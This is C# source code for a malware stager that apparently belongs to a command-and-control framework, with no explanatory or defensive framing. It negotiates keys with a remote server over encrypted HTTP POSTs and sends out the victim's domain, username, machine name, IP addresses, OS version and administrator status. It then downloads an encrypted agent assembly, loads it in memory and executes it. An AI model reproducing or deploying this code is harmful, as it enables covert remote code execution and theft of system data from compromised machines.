using System;
using System.Text;
using System.Net;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Diagnostics;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;

namespace Stager
{
    public class Stager
    {
        public static void Run(string server,string sk,string u) {
            StartNegotiate(server, sk, u);
        }

        private static byte[] ConvertToRC4ByteStream(byte[] rck,byte[] input){
            byte[] str = Enumerable.Range(0, 256).Select(c => Convert.ToByte(c)).ToArray();
            int j = 0;
            int i = 0;
            for (; i < str.Length; i++) {
                j = (j + str[i] + rck[i % rck.Length]) % 256;
                byte tmp = str[i];
                str[i] = str[j];
                str[j] = tmp;
            }
            i = j = 0;
            byte[] buffer = new byte[input.Length];
            foreach (byte b in input) {
                i = (i + 1) % 256;
                j = (j + str[i]) % 256;
                byte tmp = str[i];
                str[i] = str[j];
                str[j] = tmp;
                buffer[i-1] = (byte)(b ^ str[(str[i] + str[j]) % 256]);
            }
            return buffer;
        }

        private static byte[] DecryptBytes(byte[] key, byte[] input) {
            if (input.Length > 32) {
                HMACSHA256 hmac = new HMACSHA256();
                byte[] mac = input.Skip(input.Length - 10).ToArray();
                byte[] tmp = input.Take(input.Length - 10).ToArray();
                hmac.Key = key;
                byte[] expected = hmac.ComputeHash(tmp).Take(10).ToArray();
                if (!mac.SequenceEqual(expected)) {
                    return null;
                }
                byte[] iv = tmp.Take(16).ToArray();
                var aes = new AesCryptoServiceProvider();
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;
                return aes.CreateDecryptor().TransformFinalBlock(tmp.Skip(16).ToArray(), 0, tmp.Length - 16);
            }
            return null;
        }
        private static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        private static void StartNegotiate(string s,string sk,string ua= "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", IWebProxy proxy = null) {
            Encoding e = Encoding.UTF8;
            string customHeaders = "";
            Random rd = new Random();
            ServicePointManager.Expect100Continue = false;
            byte[] skb = e.GetBytes(sk);
            AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
            byte[] iv = new byte[16];
            rd.NextBytes(iv);
            aes.Mode = CipherMode.CBC;
            aes.Key = skb;
            aes.IV = iv;

            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = skb;

            CspParameters csp =new CspParameters();
            csp.Flags = (CspProviderFlags)((byte)csp.Flags | (byte)CspProviderFlags.UseMachineKeyStore);
            RSACryptoServiceProvider rs = new RSACryptoServiceProvider(2048, csp);
            string rk =rs.ToXmlString(false);

            byte[] id = new byte[8];
            rd.NextBytes(id);
            id = e.GetBytes(id.Select(c => "ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()[c % 31]).ToArray());
            byte[] ib = e.GetBytes(rk);
            byte[] eb = iv.Concat(aes.CreateEncryptor().TransformFinalBlock(ib,0, ib.Length)).ToArray();
            eb = eb.Concat(hmac.ComputeHash(eb).Take(10)).ToArray();

            WebClient wc = new WebClient();

            wc.Proxy = WebRequest.GetSystemWebProxy();
            wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
            if (proxy != null) {
                wc.Proxy = proxy;
            }

            if (!customHeaders.Equals("")) {
                string[] headers = customHeaders.Split(',');
                foreach (string header in headers) {
                    string headerKey = header.Split(':')[0];
                    string headerValue = header.Split(':')[1];
                    if (headerKey.Equals("host")){
                        try {wc.DownloadData(s);} catch {}
                    };
                    wc.Headers.Add(headerKey, headerValue);
                }
            }
            wc.Headers.Add("User-Agent", ua);

            iv = BitConverter.GetBytes(rd.Next(int.MaxValue));
            byte[] data = id.Concat(new byte[4]{ 0x03, 0x02, 0x00, 0x00}).Concat( BitConverter.GetBytes(eb.Length)).ToArray();
            var rc4p = ConvertToRC4ByteStream(iv.Concat(skb).ToArray(), data);
            rc4p = iv.Concat(rc4p).Concat(eb).ToArray();

            byte[] raw = wc.UploadData(s+"/index.jsp","post",rc4p);
            byte[] de = rs.Decrypt(raw, false);

            string nonce = e.GetString(de.Take(16).ToArray());
            byte[] key = de.Skip(16).ToArray();
            nonce = (long.Parse(nonce) + 1).ToString();
            aes = new AesCryptoServiceProvider();
            iv = new byte[16];
            rd.NextBytes(iv);

            aes.Mode = CipherMode.CBC;
            aes.Key = key;
            aes.IV = iv;
            string i = nonce + "|" + s + "|" + Environment.UserDomainName + "|" + Environment.UserName + "|" + Environment.MachineName;


            try
            {
                IPAddress[] p = Dns.GetHostAddresses(Dns.GetHostName());
                i = i + "|";
                string ipv4 = "";
                string ipv6 = "";
                foreach (IPAddress pp in p) {
                    if (pp.AddressFamily == AddressFamily.InterNetworkV6)
                    {
                        ipv6 += pp.ToString().Trim() + " ";
                    }
                    else {
                        ipv4 += pp.ToString().Trim() + " ";
                    }
                }
                i = i + (ipv4 + ipv6).Trim();
            }
            catch
            {
                i = i + "|" + "[FAILED]";
            }

            i = i + "|" + Environment.OSVersion.VersionString;

            if (Environment.UserName.ToLower() == "system") i += "|True";
            else {
                i += "|" + new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }

            Process n = Process.GetCurrentProcess();
            String version = Environment.Version.Major.ToString();
            byte ver =0x04;
            String language="dotnet45";
            if(version.Equals("2"))
            {
                language="dotnet35";
                ver =0x03;
            }

            i += "|" + n.ProcessName + "|" + n.Id;
            i += "|"+language+"|" + version;

            byte[] ib2 = e.GetBytes(i);
            byte[] eb2 = iv.Concat(aes.CreateEncryptor().TransformFinalBlock(ib2, 0, ib2.Length)).ToArray();
            hmac.Key = key;
            eb2 = eb2.Concat(hmac.ComputeHash(eb2).Take(10)).ToArray();

            byte[] iv2 = BitConverter.GetBytes(rd.Next(int.MaxValue));
            byte[] data2 = id.Concat(new byte[] { ver, 0x03, 0x00, 0x00 }).Concat(BitConverter.GetBytes(eb2.Length)).ToArray();
            byte[] rc4p2 = ConvertToRC4ByteStream(iv2.Concat(skb).ToArray(), data2);
            rc4p2 = iv2.Concat(rc4p2).Concat(eb2).ToArray();

            raw = wc.UploadData(s + "/index.php", "post", rc4p2);
            string decryptedAssembly = e.GetString(DecryptBytes(key, raw));
            Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { s, sk, key, e.GetString(id) });
            GC.Collect();
        }
    }
}